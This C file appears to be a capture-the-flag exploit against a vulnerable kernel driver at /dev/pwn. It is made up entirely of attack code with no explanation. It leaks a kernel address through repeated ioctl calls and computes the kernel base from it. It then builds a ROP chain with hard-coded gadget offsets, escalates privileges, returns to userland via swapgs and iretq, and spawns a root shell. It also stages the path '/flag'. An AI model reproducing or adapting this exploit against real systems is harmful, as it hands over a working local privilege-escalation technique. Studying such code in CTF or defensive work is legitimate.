#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
int tmp;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get_shell(int sig){
	system("sh");
}

int main(){
	signal(SIGSEGV,get_shell);
	save_status();	
	char *addr = (void*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);	
	memset(addr,0,0x1000);
	printf("%p\n",addr);
	int fd = open("/dev/pwn",O_RDONLY);
	uint64_t buf[0x22];
	buf[0] = 1;
	buf[1] = (size_t)addr;
	buf[2] = 0x8;
	ioctl(fd,6,buf);
	ioctl(fd,6,buf);
	ioctl(fd,6,buf);
	buf[1] = (size_t)addr+0xffc;
	for(int i=0;i<3;i++){
		buf[0x21] = i;
		ioctl(fd,666,buf);
	}

	buf[1] = (size_t)addr;
	ioctl(fd,6,buf);
	
	buf[0x21] = 1;
	ioctl(fd,66,buf);
	size_t kcode = *(size_t*)addr-0x26ffa0;
	printf("%p\n",(void*)kcode);
	kcode -= 0xffffffff81000000;
	
	strcpy(addr+0x500,"/flag");

	size_t *rop = (size_t*)&addr[0x10];
	int i=0;
	/*
	rop[i++] = kcode + 0xffffffff81086800; // : pop rdi ; ret;
	rop[i++] = 0x6f0;
	rop[i++] = kcode + 0xffffffff81020480;
	rop[i++] = 0x0;*/

	rop[i++] = kcode + 0xffffffff81086800; // : pop rdi ; ret;
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9db0;
	rop[i++] = kcode + 0xffffffff8151224c; //: push rax ; pop rdi ; add byte ptr [rax], al ; pop rbp ; ret
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9a00;
       

        rop[i++] = kcode + 0xffffffff81070894; // swapgs ; pop rbp ; ret
        rop[i++] = 0;
        rop[i++] = kcode+0xffffffff81036bfb; // iretq
        rop[i++] = (size_t)get_shell;
        rop[i++] = user_cs;                /* saved CS */
        rop[i++] = user_rflags;            /* saved EFLAGS */
        rop[i++] = user_sp;
        rop[i++] = user_ss;

	rop[i++] = kcode + 0xffffffff8100021e;

	buf[2] = 0x400;
	ioctl(fd,6,buf);

	buf[2] = 0x8;
	buf[0x21] = 0;
	*(size_t*)addr = kcode+0xffffffff81488731;
	ioctl(fd,666,buf);
	buf[0] = 4;
	ioctl(fd,6666,buf);
	
	

	

}
